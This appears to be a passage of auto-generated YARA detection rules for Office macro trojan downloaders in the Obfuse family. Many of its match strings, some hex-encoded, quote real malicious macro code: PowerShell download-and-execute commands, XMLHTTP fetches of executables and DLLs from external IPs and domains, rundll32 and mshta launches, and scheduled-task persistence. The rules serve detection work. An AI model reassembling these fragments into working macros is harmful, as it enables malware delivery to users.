        $x_1_1 = "SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAc" ascii //weight: 1
        $x_1_2 = "AA6AC8ALwA2ADkALgA0ADUALgAxADkALgAyADUANAA6ADgAMAA4ADAALwBOAHIAbgAzAEcARABqADgAOQB0ADUALwBSAHUAbgBNAGUAZABpAGEALgB0AHgAdAAnACkAKQAgAA==" ascii //weight: 1
        $x_1_3 = "ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101)" ascii //weight: 1
        $x_1_4 = "& ChrW(32) & ChrW(45) & ChrW(101) & ChrW(112) & ChrW(32) & ChrW(98) & ChrW(121) & ChrW(112) & ChrW(97) & ChrW(115) & ChrW(115) & ChrW(32) & ChrW(45) & ChrW(101) & ChrW(32)" ascii //weight: 1
        $x_1_5 = "VBA.Shell (" ascii //weight: 1
        $x_1_6 = "VBA.Environ$(\"COMSPEC\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SB_2147752510_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SB!MSR"
        threat_id = "2147752510"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Download" ascii //weight: 1
        $x_1_2 = "ShellExecute" ascii //weight: 1
        $x_3_3 = {68 74 74 70 73 3a 2f 2f 64 61 6e 67 65 72 6f 75 73 6c 79 2e [0-21] 73 76 63 2e 64 6c 6c}  //weight: 3, accuracy: Low
        $x_3_4 = {68 74 74 70 3a 2f 2f 67 72 61 72 73 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 3, accuracy: Low
        $x_3_5 = {68 74 74 70 3a 2f 2f 74 61 6d 62 6f 65 2e 6e 65 74 2f [0-6] 2e 65 78 65}  //weight: 3, accuracy: Low
        $x_3_6 = {68 74 74 70 3a 2f 2f 72 65 74 6f 68 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 3, accuracy: Low
        $x_3_7 = {68 74 74 70 3a 2f 2f 6b 77 61 74 6f 76 2e 63 6f 6d 2f [0-6] 2e 65 78 65}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_SB_2147752510_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SB!MSR"
        threat_id = "2147752510"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 65 74 [0-1] 2e 4f 4c 45 4f 62 6a 65 63 74 73 28 22 4f 62 6a 65 63 74 [0-2] 22 29 2e 43 6f 70 79}  //weight: 1, accuracy: Low
        $x_1_2 = "expandEnvironmentStrings(\"%APPDATA%\")" ascii //weight: 1
        $x_1_3 = "MkDir \"C:\" + \"\\KB4\" + \"" ascii //weight: 1
        $x_1_4 = "CreateObject(\"Wscript.Shell\")" ascii //weight: 1
        $x_1_5 = "Shell.Run \"SchTasks /Create /SC" ascii //weight: 1
        $x_1_6 = "CopyFile Environ(\"Temp\") & \"\\KB4\" +" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_TU_2147752546_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.TU!MTB"
        threat_id = "2147752546"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = CreateObject(\"WSCript.shell\")" ascii //weight: 1
        $x_1_2 = {62 69 67 6d 69 72 2e 68 6f 73 74 2f [0-48] 2e 65 78 65 22 4e 00 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {57 69 6e 64 6f 77 73 2f 54 65 6d 70 2f [0-32] 2e 65 78 65 22 32 00 2e 73 61 76 65 74 6f 66 69 6c 65 20 22 43 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_4 = {57 69 6e 64 6f 77 73 5c 54 65 6d 70 5c [0-32] 2e 65 78 65 22 2c 00 2e 52 75 6e 20 22 22 22 43 3a 5c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_WX_2147753004_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.WX!MTB"
        threat_id = "2147753004"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {31 37 38 2e 36 32 2e 34 31 2e 33 37 3a 34 34 34 34 2f [0-9] 2e 65 78 65 24 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 [0-9] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 28 22 63 6d 64 20 2f 63 20 44 3a 5c 55 73 65 72 73 5c [0-20] 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-9] 2e 65 78 65 20 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_UV_2147753012_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.UV!MTB"
        threat_id = "2147753012"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = CreateObject(\"WSCript.shell\")" ascii //weight: 1
        $x_1_2 = "lineText = singleLine.Range.Text" ascii //weight: 1
        $x_1_3 = {52 65 70 6c 61 63 65 28 [0-25] 2c 20 22 [0-40] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 20 [0-25] 2c 20 32 20 2d 20 32 2e 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_YZ_2147753139_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.YZ!MTB"
        threat_id = "2147753139"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = {74 72 61 6e 73 76 61 6c 65 2e 73 73 6c 62 6c 69 6e 64 61 64 6f 2e 63 6f 6d 2f [0-9] 2e 68 74 6d 6c 27 00 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 28 [0-9] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_UW_2147753141_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.UW!MTB"
        threat_id = "2147753141"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub ndCwhBi_d4b63Yp9Hh1o9ALNcI()" ascii //weight: 1
        $x_1_2 = "hhfgghgff = 3" ascii //weight: 1
        $x_1_3 = "b___v = Chr(ds - 99)" ascii //weight: 1
        $x_1_4 = "oidffgdngk = \"fdshuug fjijgvbodfs4 dffg89eref\"" ascii //weight: 1
        $x_1_5 = "fdsgdfsoi = \"iosadfodsi 5646 dsafdsyagf8 fisduerw98\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RDU_2147753217_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RDU!MTB"
        threat_id = "2147753217"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = "InParameters.SpawnInstance" ascii //weight: 1
        $x_1_3 = ".ExecMethod_(TC()" ascii //weight: 1
        $x_1_4 = {28 22 33 20 32 20 5f 22 29 20 26 20 [0-6] 28 22 20 50 20 72 20 6f 20 63 20 65 20 73 20 73 20 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = "UserForm_Click()" ascii //weight: 1
        $x_1_6 = "Join(Split(TU, \" \"), \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PK_2147753264_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PK!MTB"
        threat_id = "2147753264"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Document_Open()" ascii //weight: 1
        $x_1_2 = "Call Multinuclear" ascii //weight: 1
        $x_1_3 = {47 65 74 4f 62 6a 65 63 74 28 22 77 22 20 26 20 22 69 22 20 26 20 22 6e 22 20 26 20 22 6d 22 20 26 20 22 67 6d 74 22 20 26 20 22 73 22 20 26 20 22 3a 5c 5c 22 20 26 20 [0-15] 20 26 20 22 5c 72 6f 22 20 26 20 22 6f 74 5c 63 69 22 20 26 20 22 6d 76 32 22 20 26 20 22 3a 57 22 20 26 20 22 69 6e 33 22 20 26 20 22 32 5f 50 22 20 26 20 22 72 6f 63 22 20 26 20 22 65 22 20 26 20 22 73 22 20 26 20 22 73 22 29 2e 43 72 65 61 74 65}  //weight: 1, accuracy: Low
        $x_1_4 = "= ActiveDocument.Variables(\"d3a8e88c97d\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SKR_2147753572_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SKR!MTB"
        threat_id = "2147753572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 22 22 22 20 2b 20 22 6d 73 22 20 2b 20 22 68 74 61 22 22 22 22 68 74 74 70 73 3a 5c 5c 25 34 30 25 34 30 40 6a 2e 6d 70 5c [0-20] 22 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub calculator()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SKR_2147753572_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SKR!MTB"
        threat_id = "2147753572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 22 22 22 20 2b 20 22 6d 73 22 20 2b 20 22 68 74 61 22 22 22 22 22 20 2b 20 22 68 74 74 70 73 3a 5c 5c 25 34 30 25 34 30 40 6a 2e 6d 70 5c [0-20] 22 22 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Sub Auto_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PT_2147753662_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PT!MTB"
        threat_id = "2147753662"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 63 6f 6d 2e 62 72 2f 3c 00 3d 20 22 4d 53 48 54 41 20 (68 74|68 74 74) 3a 2f 2f 6d 61 72 69 6e 67 61 72 65 73 65 72 76 61 73}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (Var)" ascii //weight: 1
        $x_1_3 = "Sub Auto_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PT_2147753662_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PT!MTB"
        threat_id = "2147753662"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 22 63 4d 64 20 2f 63 20 63 64 20 25 54 45 4d 50 25 20 26 40 65 63 68 6f 20 47 38 65 20 3d 20 22 22 68 74 74 70 3a 2f 2f 63 6f 6d 70 61 6e 79 2e 73 75 70 65 72 77 65 62 2e 77 73 2f 76 69 65 77 2f 6e 6f 74 65 2e 65 78 65 22 22 3e 3e 51 36 6a 2e 76 62 73 20 26 40 65 63 68 6f 20 57 37 78 20 3d 20 4e 36 6f 28 22 22 [0-16] 22 22 29 3e 3e 51 36 6a 2e 76 62 73}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 20 22 63 4d 64 20 2f 63 20 63 64 20 25 54 45 4d 50 25 20 26 40 65 63 68 6f 20 49 36 6c 20 3d 20 22 22 68 74 74 70 3a 2f 2f 76 69 65 77 2e 73 75 70 65 72 77 65 62 2e 77 73 2f 73 69 74 65 2f 66 6f 6c 64 65 72 2e 65 78 65 22 22 3e 3e 46 35 73 2e 76 62 73 20 26 40 65 63 68 6f 20 44 39 71 20 3d 20 53 32 6c 28 22 22 [0-16] 22 22 29 3e 3e 46 35 73 2e 76 62 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LKT_2147753773_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LKT!MTB"
        threat_id = "2147753773"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 69 6d 20 [0-21] 20 41 73 20 53 74 72 69 6e 67 3a 20 [0-21] 20 3d 20 53 68 65 65 74 73 28 22 [0-7] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-1] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {45 6e 64 20 53 75 62 02 00 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_3 = {44 69 6d 20 [0-32] 20 41 73 20 4c 6f 6e 67 3a 20 44 69 6d 20 [0-32] 28 29 20 41 73 20 42 79 74 65 02 00 47 6f 54 6f}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 [0-32] 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_5 = {47 6f 54 6f 20 [0-32] 45 78 69 74 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 74 72 43 6f 6e 76 28 [0-21] 2c 20 36 34 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PNO_2147754076_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PNO!MTB"
        threat_id = "2147754076"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set xmlhttp = CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_2 = "= ActiveDocument.CustomDocumentProperties(\"ipadr\").Value" ascii //weight: 1
        $x_1_3 = {3d 20 70 76 47 65 74 46 69 6c 65 28 22 68 74 74 70 3a 2f 2f 22 20 2b 20 [0-8] 20 2b 20 22 2f 65 61 73 79 64 6f 72 65 2f 64 6f 63 75 6d 65 6e 74 2f 63 68 61 6d 70 73 46 75 73 69 6f 6e 2e 68 74 6d 6c 3f 6e 6f 63 61 63 68 65 3d 22 20 26 20 4e 6f 77 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Call displayError(\"UTF8_Decode\", Err.Number, Err.Description)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRB_2147754180_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRB!MTB"
        threat_id = "2147754180"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(yQemRIF, \"vriryvf\", \"\")" ascii //weight: 1
        $x_1_2 = "= Replace(UCFcqcWmb, \"bvwcpmjht\", \"\")" ascii //weight: 1
        $x_1_3 = "= GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")" ascii //weight: 1
        $x_1_4 = "objStartUp = objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_5 = "= objStartUp.SpawnInstance_" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LOP_2147754232_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LOP!MTB"
        threat_id = "2147754232"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {26 20 43 68 72 28 43 49 6e 74 28 53 68 65 65 74 73 28 22 [0-21] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-1] 29 2e 56 61 6c 75 65 20 26 20 4d 69 64 28 [0-16] 2c 20 [0-16] 2c 20 [0-2] 29 29 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 68 65 65 74 73 28 22 [0-21] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-1] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell " ascii //weight: 1
        $x_1_4 = "GoTo " ascii //weight: 1
        $x_1_5 = {45 6e 64 20 49 66 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = {50 72 69 76 61 74 65 20 53 75 62 20 [0-9] 28 29 02 00 44 69 6d 20 [0-16] 20 41 73 20 4c 6f 6e 67 3a 20 44 69 6d 20 [0-18] 20 41 73 20 53 74 72 69 6e 67 3a 20 [0-18] 20 3d 20 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(el_hH" ascii //weight: 1
        $x_1_2 = ".Run(IBSY_al4mysdD1rMJJL8u" ascii //weight: 1
        $x_1_3 = "PMaD9btzME_qNHsjsuE = ZS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kaoksdo = \"C:\\Users\\Public\\zaim.js\"" ascii //weight: 1
        $x_1_2 = "Sheet1.Range (\"O229\")" ascii //weight: 1
        $x_1_3 = "Call Shell%(wgprC4YxzckH)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "wsh.Run FgbV45g &" ascii //weight: 1
        $x_1_2 = "Set wsh = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_3 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 [0-15] 22 2c 20 22 22 29 2f 00 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + IibYCmmXU(fjkerooos), IibYCmmXU(fgfjhfgfg), \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = "IibYCmmXU = IibYCmmXU & Mid(s, p, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xHttp.Open \"GET\", \"http://167.99.50.129/charlotte.dll\", False" ascii //weight: 1
        $x_1_2 = ".savetofile \"C:\\Temp\\charlotte.dll\"," ascii //weight: 1
        $x_1_3 = "Shell (\"rundll32 C:\\Temp\\charlotte.dll, vOuovKMj\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open \"GET\", \"https://filebin.net/5ms6k4uno7qx6itc/fortnite.exe\", False" ascii //weight: 1
        $x_1_2 = ".savetofile (\"C:\\Programdata\\fortnite.exe\"), 2" ascii //weight: 1
        $x_1_3 = "Shell (\"C:\\Programdata\\Fortnite.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "asn = moasd + asdmmm + asdmmm + mwimx + asmdiasd + mas" ascii //weight: 1
        $x_1_2 = "mas = \"/%911%911%911%911%911@j.mp\\kasasdsdsasdasdd" ascii //weight: 1
        $x_1_3 = "mas = \"/%911%911%911%911%911@j.mp\\kasasxansxnasxidskdd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
